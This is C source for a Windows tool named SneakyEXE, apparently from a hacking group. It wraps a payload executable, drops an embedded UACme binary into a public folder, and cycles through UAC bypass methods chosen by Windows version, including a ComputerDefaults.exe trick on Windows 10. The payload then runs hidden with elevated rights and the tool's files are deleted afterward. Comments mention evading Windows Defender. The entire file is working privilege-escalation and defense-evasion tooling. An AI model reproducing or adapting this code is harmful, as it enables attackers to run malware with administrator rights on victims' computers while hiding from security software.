/*
  /$$$$$$                                /$$                 /$$$$$$$$ /$$   /$$ /$$$$$$$$
 /$$__  $$                              | $$                | $$_____/| $$  / $$| $$_____/
| $$  \__/ /$$$$$$$   /$$$$$$   /$$$$$$ | $$   /$$ /$$   /$$| $$      |  $$/ $$/| $$
|  $$$$$$ | $$__  $$ /$$__  $$ |____  $$| $$  /$$/| $$  | $$| $$$$$    \  $$$$/ | $$$$$
 \____  $$| $$  \ $$| $$$$$$$$  /$$$$$$$| $$$$$$/ | $$  | $$| $$__/     >$$  $$ | $$__/
 /$$  \ $$| $$  | $$| $$_____/ /$$__  $$| $$_  $$ | $$  | $$| $$       /$$/\  $$| $$
|  $$$$$$/| $$  | $$|  $$$$$$$|  $$$$$$$| $$ \  $$|  $$$$$$$| $$$$$$$$| $$  \ $$| $$$$$$$$
 \______/ |__/  |__/ \_______/ \_______/|__/  \__/ \____  $$|________/|__/  |__/|________/
                                                   /$$  | $$
                                                  |  $$$$$$/
                                                   \______/
 #==============================[Description]========================================#
 #                                                                                   #
 # >> bio : Customize payloads and help it elevating privlege, Bypassing UAC         #
 # >> Author  : Zenix Blurryface ( Hackernese's admin )                              #
 # >> Version : v1.2 demo                                                            #
 # >> License : It was mostly self-written but this tool does embed UACme - Author : #
 #              hfiref0x : https://github.com/hfiref0x                               #
 # >> Disclaimer : This tool was made for reluctant but humane situations or academic#
 #                 purposes only, i ain't taking any responsibility if you abuse it. #
 #                                                                                   #
 #===================================================================================#
*/
// gcc (MinGW.org GCC-8.2.0-3) 8.2.0
// Copyright (C) 2018 Free Software Foundation, Inc.
// This is free software; see the source for copying conditions.  There is NO
// warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
#include <stdio.h>
#include <string.h>
#include <dirent.h>
#include <stdlib.h>
#include <unistd.h>
#include <limits.h>
#include <errno.h>
#include <dirent.h>     // I know this is useless but i was too afraid to delete it
#include <windows.h>
#include "S64_1.h"      // Bypassing Methods 64bit ( section 1 )
#include "Tool32_1.h"   // Bypassing Methods 32bit ( section 1 )
#include "Methods.h"    // Contains extra self-made methods for bypassing ( still in progress )
#include "S64_2.h"      // Bypassing Methods 64bit ( section 1 )
#include "Tool32_2.h"   // Bypassing Methods 32bit ( section 1 )
// Just to bypass Windows defender a bit here
#define I_HAVE_NO_IDEA_WHAT_IS_THIS_VARIABLE_FOR ":}" // Seriously...

unsigned char Install_Option[] = "X_Option";          // 1 : execute, 2 : shellcode
unsigned char DirectoryCode[41]= "AAAAAAAA"
         "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";          // Temoprary directory
char NamingConventionExe[] =  "***********************************"
     "************************************************************"// No no, i didn't type all of these to scare you
     "************************************************************"// Just don't touch it, it's for a reason :}
     "************************************************************"
     "*********************************************";

unsigned int  OriginalSize = 325579 ;               // Original size of the exploit

static short Win10Methods[2][29]= { // Win10 methods
     {46,47,35,42,41,15,10,14,26,25,29,31,27,24,23,17,19,18,39,40,3,33,30,32,21,37,12,20,0}, // 32 bit
     {46,47,35,42,41,15,10,14,26,25,29,31,27,24,23,17,19,18,39,40,3,33,30,32,21,37,12,20,0} // 64 bit
};
static short Win8Methods[2][29] = { // Win8 methods
     {35,43,44,34,39,40,41,25,27,30,42,3,2,13,15,24,23,32,21,19,18,4,7,6,17,14,9,10,0}, // 32 bit
     {35,43,44,34,39,40,41,25,27,30,42,3,2,13,15,24,23,32,21,19,18,4,7,6,17,14,9,10,0} // 64 bit
};

//-------------Functions-------------//

BOOL ElevateSelf(void);

int DirectoryExist(LPCTSTR szPath);   // a random prototype

unsigned long GetSizeFile(char file[]){ // Get the god damn size
     WIN32_FILE_ATTRIBUTE_DATA tData;
     GetFileAttributesEx(file, GetFileExInfoStandard , &tData );
     return (long)tData.nFileSizeLow;
}

int CheckSysInformation(int *Bit){ // Checking information about the system
     FILE *incaseF;
     HKEY hKey;
     DWORD SizeOfTheBuffer = 100;
     char Buffer[100];
     int r1,r2;
     if(!DirectoryExist("C:\\Program Files (x86)")){ // Checking the Version of Windows (64/32 bit)
          *Bit = 1;
     }
     r1 = RegOpenKeyA(    // Opening the RegKey at HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion
          HKEY_LOCAL_MACHINE,
          "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
          &hKey
     );
     r2 = RegQueryValueEx( // Extracting information from ProductName
          hKey ,   "ProductName" ,
          0 ,       NULL ,
          Buffer ,  &SizeOfTheBuffer
     );
     if(!(r2==ERROR_SUCCESS && r1 == ERROR_SUCCESS)){  // Getting return code whether it == ERROR_SUCCESS
          incaseF = popen("wmic os get name | find /i \"Windows\"", "r");
          fgets(Buffer, 20, incaseF);
          pclose(incaseF);
          Buffer[0] = Buffer[18];
     }else{
          Buffer[0] = Buffer[8];
     }
     if(Buffer[0]=='7'){ // Windows 7
          return 7;
     }else if(Buffer[0]=='8'){ // Windows 8
          return 8;
     }
     return 10; // Windows 10
}

int ExecFunction(char ExeName[]){ // When it has been successfully escalated
     char *UserProfile=getenv("USERPROFILE"), Execute[PATH_MAX];
	SHELLEXECUTEINFO ShExecInfo = {0};
	int ErrorLast,e;

	ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
	ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
	ShExecInfo.hwnd = NULL;
	ShExecInfo.lpVerb = NULL;
	ShExecInfo.lpDirectory = NULL;
	ShExecInfo.nShow = SW_HIDE;
	ShExecInfo.hInstApp = NULL;
	ShExecInfo.lpParameters = NULL;

     strcpy(Execute, "C:\\Users\\Public\\"); // Initialize the path
     strcat(Execute, DirectoryCode);         // Add in the default directory code
     strcat(Execute, "\\");
     strcat(Execute, ExeName);               // Add in payload's name

     _chdir(UserProfile);                     // Switch to USERPROFILE

	ShExecInfo.lpFile = Execute;

	ShellExecuteEx(&ShExecInfo); // Execute
	WaitForSingleObject(ShExecInfo.hProcess,INFINITE);

     sprintf(Execute, "C:\\Users\\Public\\%s", DirectoryCode);
	_chdir(Execute);
	DeleteFileA("UAC.exe");
	perror("");
	DeleteFileA("CheckFile.d");
	DeleteFileA(ExeName);
	_chdir(".."); // Switch back

	while(RemoveDirectoryA(DirectoryCode)==0){}
     return 0; // Succeeded !!
}

void ExecuteSys(int VersionName, int x32, char ExE[]){ // Windows 8 and windows 10
     short *_Method,i=0;
     char Command[PATH_MAX],IntDir[PATH_MAX];
     FILE *Privilege, *CheckerHandler;
	SHELLEXECUTEINFO ShExecInfo = {0};

	sprintf(IntDir, "C:\\Users\\Public\\%s\\CheckFile.d",DirectoryCode);

     if(VersionName==8){/*methods for win 8 */
          _Method=Win8Methods[(x32 ? 0 : 1)];}
     else{              /*methods for win 10*/
          _Method=Win10Methods[(x32 ? 0 : 1)];}

     _chdir("C:\\Users\\Public");
     _chdir(DirectoryCode);

	ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
	ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
	ShExecInfo.hwnd = NULL;
	ShExecInfo.lpVerb = NULL;
	ShExecInfo.lpFile = "UAC.exe";
	ShExecInfo.lpDirectory = NULL;
	ShExecInfo.nShow = SW_HIDE;
	ShExecInfo.hInstApp = NULL;

	while(1){

          sprintf(Command, "%d \"%s\"",_Method[i],ExE);

		ShExecInfo.lpFile = "UAC.exe";
		ShExecInfo.lpParameters = Command;
		ShellExecuteEx(&ShExecInfo);
		WaitForSingleObject(ShExecInfo.hProcess,INFINITE);

		Sleep(10);

		if((CheckerHandler = fopen(IntDir, "r"))!=NULL){
			fclose(CheckerHandler);
			exit(0);
		}
		fclose(CheckerHandler);

          if(_Method[i+1]==0){
               ElevateSelf();
               exit(4);
          }
          i++;
     }
}

void GetBaseName(wchar_t c[]){ // Get the basename of the payload executable
	int i,o=0;
	wchar_t path[PATH_MAX], Name[100];
	GetModuleFileNameW(NULL,path,PATH_MAX);
	for(i=((int)wcslen(path))-1;i!=0;i--){
		if(path[i]=='\\'){
			break;
		}
		Name[o] = path[i];
		o++;
	}
	Name[o]='\0';
	wcscpy(c,Name);
}

BOOL DirectoryExist(LPCTSTR szPath){
     DWORD dwAttrib = GetFileAttributes(szPath);
     return (dwAttrib != INVALID_FILE_ATTRIBUTES &&(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

BOOL CheckPrivilege(void){ // Check whether the program has been elevated
     BOOL AdminPriv = FALSE;
     DWORD dwError = ERROR_SUCCESS;
     PSID Administrators_Group = NULL;

     SID_IDENTIFIER_AUTHORITY Auth = SECURITY_NT_AUTHORITY;
     if (!AllocateAndInitializeSid(// Allocate and initialize a SID of the administrators group.
          &Auth,
          2,
          SECURITY_BUILTIN_DOMAIN_RID,
          DOMAIN_ALIAS_RID_ADMINS,
          0, 0, 0, 0, 0, 0,
          &Administrators_Group)){
               dwError = GetLastError();
               goto Cleanup;
     }
     // Determine whether the SID is administrative
     // the primary access token of the main thread
     if (!CheckTokenMembership(NULL, Administrators_Group, &AdminPriv)){
          dwError = GetLastError();
          goto Cleanup;
     }
     Cleanup:
     if (Administrators_Group){ // cleanup resources
          FreeSid(Administrators_Group);
          Administrators_Group = NULL;
     }
     // Throw the error
     if (ERROR_SUCCESS != dwError){
          return FALSE;
     }
     return AdminPriv;
}

BOOL ElevateSelf(void){ // Self-elevate once every method fails
     DWORD Error;
     wchar_t PathToExe[MAX_PATH];
     if (GetModuleFileName(NULL, (LPSTR)PathToExe, MAX_PATH)){

          SHELLEXECUTEINFO sei = { sizeof(sei) }; // Try to self-elevate
          sei.lpVerb = (LPSTR)"runas";
          sei.lpFile = (LPSTR)PathToExe;
          sei.hwnd  = 0;
          sei.nShow = SW_NORMAL;
          if (!ShellExecuteEx(&sei)){
               Error = GetLastError();
			GetBaseName(PathToExe);
               if (Error == ERROR_CANCELLED){
                    MessageBoxW(
					0,
					L"This program can only work properly when it is run as administrator."
					L" Please recheck the privilege.",
					PathToExe,
					MB_ICONERROR
				);
               }
          }
     }
}

int APIENTRY WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance, LPSTR lpCmdLine,int nCmdShow){
     //---Initializing varialbes------//
     char ExE[PATH_MAX], Command[PATH_MAX+60],Binary[OriginalSize],Filename[PATH_MAX+1];
     int VersionName,x32=0,byte;
     FILE *Ffile, *ToolSupportUACAll, *OFile, *Program;
	DWORD exitc;
	SHELLEXECUTEINFO ShExecInfo = {0};
	//-------------------------------//

     GetModuleFileNameA(NULL, ExE, PATH_MAX);  // get the current Filename

	for(byte=0;NamingConventionExe[byte]!='*';byte++){ // Extracting the File's name
	     Filename[byte] = NamingConventionExe[byte];
	}
	Filename[byte] = '\0'; // THE FUCKING NULL-TERMINATOR !!!

	_chdir("C:\\Users\\Public\\"); // Switch directory

	ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
	ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
	ShExecInfo.hwnd = NULL;
	ShExecInfo.lpVerb = NULL;
	ShExecInfo.lpDirectory = NULL;
	ShExecInfo.nShow = SW_HIDE;
	ShExecInfo.hInstApp = NULL;

	if(CheckPrivilege()){
		if(!DirectoryExist(DirectoryCode)){
			sprintf(Command, "/c mkdir %s", DirectoryCode);

			ShExecInfo.lpFile = "cmd.exe";
			ShExecInfo.lpParameters = Command; // Create directory

			ShellExecuteEx(&ShExecInfo);
			WaitForSingleObject(ShExecInfo.hProcess,INFINITE);

			Ffile = fopen(ExE, "rb");
			sprintf(Command, "C:\\Users\\Public\\%s\\%s", DirectoryCode,Filename);
			OFile = fopen(Command, "wb");
	          fseek(Ffile, OriginalSize, SEEK_SET);
	          while((byte=fread(Binary, 1, OriginalSize, Ffile))!=0){
	               fwrite(Binary,1,byte,OFile);
	          }
	          fclose(OFile); // DO YOU EVEN NEED TO ASK ?
	          fclose(Ffile);

			ShExecInfo.lpFile = Command;
			ShExecInfo.lpParameters = NULL;

			ShellExecuteEx(&ShExecInfo);
			WaitForSingleObject(ShExecInfo.hProcess,INFINITE);

			DeleteFileA(Command);
			sprintf(Command, "C:\\Users\\Public\\%s", DirectoryCode);
			while(DirectoryExist(DirectoryCode)){
				RemoveDirectoryA(DirectoryCode);
			}
			return 0;
		}
		while(_chdir(DirectoryCode)!=0){};   // Switch again
          Program = fopen("CheckFile.d", "w"); // Used as a temporary file handler for checking
          fclose(Program); // God i am so tired of typing these comments but... "Closing the handle" it is .-.
		Sleep(100); // Wait for the other side to finish
          ExecFunction(Filename);
     }else{

          sprintf(Command, "/c mkdir \"C:\\Users\\Public\\%s\" > NUL 2>&1",DirectoryCode);

		ShExecInfo.lpFile = "cmd.exe";
		ShExecInfo.lpParameters = Command;

		ShellExecuteEx(&ShExecInfo);
		WaitForSingleObject(ShExecInfo.hProcess,INFINITE);
		GetExitCodeProcess(ShExecInfo.hProcess,&exitc);

		if(exitc==0){

               VersionName = CheckSysInformation(&x32);
               sprintf(Command, "C:\\Users\\Public\\%s\\UAC.exe",DirectoryCode);

               //--------Placing exploit------//
			//ExeSupport64_1_len, ExeSupport64_1
			//ExeSupport64_2_len, ExeSupport64_2
			//SupportTool_x86_1, SupportTool_x86_1_len
			//SupportTool_x86_2, SupportTool_x86_2_len
               ToolSupportUACAll = fopen(Command, "wb");
               if(x32){
				fwrite(SupportTool_x86_1,SupportTool_x86_1_len,1,ToolSupportUACAll);
                    fwrite(SupportTool_x86_2,SupportTool_x86_2_len,1,ToolSupportUACAll); // Initialize UACme ( 32bit )
               }else{
				fwrite(ExeSupport64_1,ExeSupport64_1_len,1,ToolSupportUACAll);
                    fwrite(ExeSupport64_2,ExeSupport64_2_len,1,ToolSupportUACAll); // Initialize UACme ( 64bit )
               }
               fclose(ToolSupportUACAll);
               // -----------------------------//

			while(_chdir(DirectoryCode)!=0){
			};   // Switch again

			//----------Installing--------//
	          Ffile = fopen(ExE, "rb");
			OFile = fopen(Filename, "wb");
	          fseek(Ffile, OriginalSize, SEEK_SET);
	          while((byte=fread(Binary, 1, OriginalSize, Ffile))!=0){
	               fwrite(Binary,1,byte,OFile);
	          }
	          fclose(OFile); // DO YOU EVEN NEED TO ASK ?
	          fclose(Ffile);
	          //-----------------------------//

               // --------Execution------------//
               if(VersionName==7){ // Oh yea, you may want to ask this, explanation below !!! :P
                    /*
                         Since Microsoft will stop supporting Win7 soon and this method hasn't been fixed yet
                         It will continue to work just fine on Windows-7-targets. If there is any issue about
                         how this method functions, i will try to fix the tool and adjust the repository as
                         fast as i can...
                         NOTE : Github isn't real-time adjustments so u just gotta chill :}
                    */
				sprintf(Command, "35 \"%s\"",ExE ); // Formating the arguments

				ShExecInfo.lpFile = "UAC.exe";
				ShExecInfo.lpParameters = Command;

				ShellExecuteEx(&ShExecInfo); // Execute
				WaitForSingleObject(ShExecInfo.hProcess,INFINITE); // Waiting for the process to finish
               }else if(VersionName==10){ // Windows 10

				ComDefaults(ExE); // using ComputerDefaults.exe's bugs

				Sleep(50); // Give it a break for a while
				if(!(OFile=fopen("CheckFile.d", "r"))){
					fclose(OFile);
					ExecuteSys(VersionName, x32, ExE); // Execution for WIndows 8 and 10
				}
				fclose(OFile);

			}else{ // Windows 8
               	ExecuteSys(VersionName, x32, ExE); // Execution for WIndows 8 and 10
               }
               // -----------------------------//
          };
          return 4;
     }
     return 0;
}

/* EXIT-CODES
	4 : Failed to elevate
     0 : succeeds
     1 : Failed to escalate
*/
